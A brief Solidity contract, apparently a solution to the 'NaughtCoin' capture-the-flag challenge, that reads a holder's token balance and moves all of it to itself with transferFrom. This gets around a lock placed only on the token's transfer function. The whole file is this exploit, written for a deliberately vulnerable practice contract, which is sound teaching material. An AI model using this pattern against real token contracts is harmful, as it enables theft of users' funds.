pragma solidity ^0.6.0;

interface NaughtCoin {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract ncbreak {
  function call(address _addr, address from) public {
      NaughtCoin nc = NaughtCoin(_addr);
      uint256 balance = nc.balanceOf(from);
      nc.transferFrom(from, address(this), balance);
  }

}